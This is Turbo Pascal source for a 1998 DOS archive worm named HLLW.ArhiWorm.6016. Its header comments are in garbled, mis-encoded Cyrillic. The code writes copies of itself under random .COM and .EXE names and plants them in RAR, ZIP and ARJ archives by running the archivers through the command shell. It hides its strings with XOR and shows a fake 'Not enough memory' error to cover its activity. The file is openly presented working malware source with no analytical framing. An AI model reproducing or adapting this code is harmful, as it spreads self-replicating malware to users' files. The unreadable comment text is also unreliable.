   (*
                        ‚¨àãá-ç¥à¢ì HLLW.ArhiWorm.6016
                               (c) by Duke/SMF

   €¢â®à         : Duke/SMF
   „ â  á®§¤ ¨ï : 22.09.98
   ‚¥àá¨ï        : 1.0
   Ÿ§ëª ¯à®£à.   : Turbo Pascal 7.1
   Ÿ¢«ï¥âáï à §¢¨â¨¥¬ ¨¤¥¨ ¢¨àãá  ArjVirus.

   *¥à¢® ç «ì ï ¤«¨  6016 ¡ ©â.
   *®á«¥ § ¯ãáª  ¢¨àãá ¨é¥â ¢ â¥ªãé¥¬ ª â «®£¥ ä ©«ë- àå¨¢ë ¯® à áè¨à¥¨î
   *.rar, *.zip, *.arj ¨ § ¯¨áë¢ ¥â ¢ ¨å ä ©«-ç¥à¢ì á® á«ãç ©ë¬ ¨¬¥¥¬
   (¤«¨  ¨¬¥¨ ª®«¥¡«¥âáï ®â 1 ¤® 8 á¨¬¢®«®¢), à áè¨à¥¨¥¬ COM ¨«¨ EXE ¨
   ¤«¨®©, ª®«¥¡«îé¥©áï ®â 6016 ¤® 6516 ¡ ©â §  áç¥â § ¯¨á ®£® ¢ ª®æ¥
   ä ©«  ¬ãá®à . ‚¨àãá ®¡à ¡ âë¢ ¥â  âà¨¡ãâ Read-Only   ¯®à ¦ ¥¬ëå
    àå¨¢ å. ‚ ã¯ ª®¢ ®¬ á®áâ®ï¨¨ à ¡®â®á¯®á®¡®áâì ¢¨àãá  á®åà ï¥âáï,
   â®«ìª® á®§¤ ¢ ¥¬ë¥ ¨¬ ç¥à¢¨ áâ ®¢ïâáï ¡®«¥¥ "¯à®§à çë¬¨".

   *)
   {---------------------------------------------------------------------------}
   {$M 5000, 0, 5000}
   {$A-,B-,D-,E+,F-,G-,I-,L-,N-,S-,V-,X+}
   program ArhiWorm;
   uses dos;
   const len=6010;                {¤«¨  ¢¨àãá }
   var arh:string;                {à áè¨à¥¨¥  àå¨¢ }
       c  :string;                {áâà®ª  ¯®¤ GetEnv('COMSPEC')}
       m  :string;                {áâà®ª  ¯®¤ ¯ à ¬¥âàë}
       vir:file;                  {§ ¯ãé¥ë© ä ©«}
       mas:array[1..len] of char; {¬ áá¨¢, á®¤¥à¦ é¨© â¥«® ¢¨àãá }
   {---------------------------------------------------------------------------}
   function Xorer(st:string):string;
   var i:integer;
       m:byte;
       z:string;
   begin
   z:='';
   for i:=1 to length(st) do z:=z+chr(ord(st[i]) xor i);
   Xorer:=z;
   end;
   {---------------------------------------------------------------------------}
   procedure zar(name:string);    (* ‡ à ¦¥¨¥  àå¨¢®¢ *)
   var st:string;                 {¨¬ï á®§¤ ¢ ¥¬®£® ä ©« -¢¨àãá }
       par:string;                {¯ à ¬¥âàë § ¯ãáª  Command.COM}
       n:integer;                 {¯à®¬¥¦ãâ®çë© áç¥âç¨ª}
       f,g:file;                  {ç¥à¢ì ¨  àå¨¢}
       at:word;                   { âà¨¡ãâë ä ©« }
       ch:char;
       w:string;                  {'>nul'}
   const p=' ';
   begin
   w:=Xorer('?lvh');              {'>nul'}
      (* ‘«ãç ©ë¬ ®¡à §®¬ á®§¤ ¥¬ ¨¬ï ä ©« -¢¨àãá : *)
   st:='';
   for n:=1 to (random(8)+1) do st:=st+chr(random(26)+97);
   n:=random(4);
   if (n=0) or (n=3) then st:=st+Xorer('/g{a') {.exe}
                     else st:=st+Xorer('/ali');{.com}
       (* ‘®§¤ ¥¬ ä ©«-¢¨àãá á«ãç ©®© ¤«¨ë: *)
   assign(f,st);rewrite(f,1);
   blockwrite(f,mas,len); {? 1}
   for n:=1 to random(500) do
     begin ch:=chr(random(256));blockwrite(f,ch,1);end;
   close(f);
       (* ‡ ¯¨áë¢ ¥¬ (¤®¡ ¢«ï¥¬) ¥£® ¢  àå¨¢: *)
   assign(g,name);
   getfattr(g,at);
   setfattr(g,$20);
   par:='/c'+p;
   if arh=Xorer('scq') {rar}
     then par:=par+Xorer('scq$d&*|b*&u-#l=1?|?')+p+name+p+st+w;
     {rar a -tk -y -c- -o+}
   if arh=Xorer('{ks') {zip}
     then par:=par+Xorer('qiymu&*i')+p+name+p+st+w; {pkzip -a}
   if arh=Xorer('`pi') {arj}
     then par:=par+Xorer('`pi$d')+p+name+p+st+w; {arj a}
   exec(c,par);
   setfattr(g,at);
   erase(f);                      {ã¤ «ï¥¬ ¢¨àãá}
   end;
   {---------------------------------------------------------------------------}
   procedure find;                (* *®¨áª  àå¨¢®¢ ¨ ¢ë§®¢ § à ¦¥¨ï *)
   var s:searchrec;
       t:string;
   const z='*.';
   begin
   findfirst(z+arh,$21,s);
   if doserror<>0 then exit else begin t:=s.name;zar(s.name) end;
   while doserror=0 do
     begin
     findnext(s);
     if t=s.name then exit else begin t:=s.name;zar(s.name) end
     end
   end;
   {---------------------------------------------------------------------------}
   begin
   Randomize;
       (* *à®¢¥àª  áªàëâëå ¯ à ¬¥âà®¢: *)
   if (paramcount=1) and (paramstr(1)='!') then
     begin
     writeln(Xorer('INOS+Gu``]d~`.y!?"3<v?7z`:_iv{0sld'));
                   {HLLW.ArhiWorm v1.0 (c) by Duke/SMF 22.09.98}
     halt;
     end;
       (* —¨â ¥¬ â¥«® ¢¨àãá  : *)
   assign(vir,paramstr(0));reset(vir,len);
   blockread(vir,mas,1);close(vir);
       (* *®¨áª ¨ § à ¦¥¨¥: *)
   c:=GetEnv(Xorer('BMNWUCD'));{COMSPEC}
   arh:=Xorer('scq');{rar}find;
   arh:=Xorer('{ks');{zip}find;
   arh:=Xorer('`pi');{arj}find;
       (* ‚ëå®¤ á á®®¡é¥¨¥¬ ®¡ ®è¨¡ª¥: *)
   writeln(Xorer('Omw$`hh}nb+ahc`bh'));{Not enough memory}
   end.
   {--------------------------------------------------------------------------}
